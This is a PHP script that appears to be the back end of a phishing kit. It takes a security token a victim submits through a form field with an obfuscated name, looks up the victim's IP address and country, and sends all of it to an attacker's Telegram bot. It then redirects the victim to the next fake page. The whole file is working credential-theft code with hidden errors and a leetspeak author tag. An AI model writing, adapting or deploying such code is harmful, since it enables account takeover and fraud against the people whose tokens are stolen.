<?php
ini_set("display_errors", 0);
include "infotelegram.php";


if (isset($_POST['t0s24u824s']) ) {
    $input = $_POST['t0s24u824s'];
    $ipInfoResponse = getIpInfo($_SERVER['REMOTE_ADDR']);
    $codigopais = isset($ipInfoResponse['country']) ? $ipInfoResponse['country'] : 'Desconocido';
    $mensajex .= "🔵F0RM0S4🔵\n🔑T0K4N: ".$_POST['t0s24u824s']."\nIP: ".$_SERVER['REMOTE_ADDR']."\nPaís: ".$codigopais."\n🔵C0DE BY SYN4PSE🔵";

    env($token, $tid, $mensajex);
}
function getIpInfo($ip) {
    $url = "http://ipinfo.io/{$ip}/json";  
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($curl);
    curl_close($curl);
    
    return json_decode($response, true);
}
function env($token, $chatID, $mensaje) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $data = array(
        'chat_id' => $chatID,
        'text' => $mensaje
    );

    $options = array(
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query($data),
        CURLOPT_RETURNTRANSFER => true,
    );

    $curl = curl_init();
    curl_setopt_array($curl, $options);
    $response = curl_exec($curl);
    curl_close($curl);

    return $response;
    
}
echo "<script>window.location.href = \"../tkss2.html\"</script>";
?>



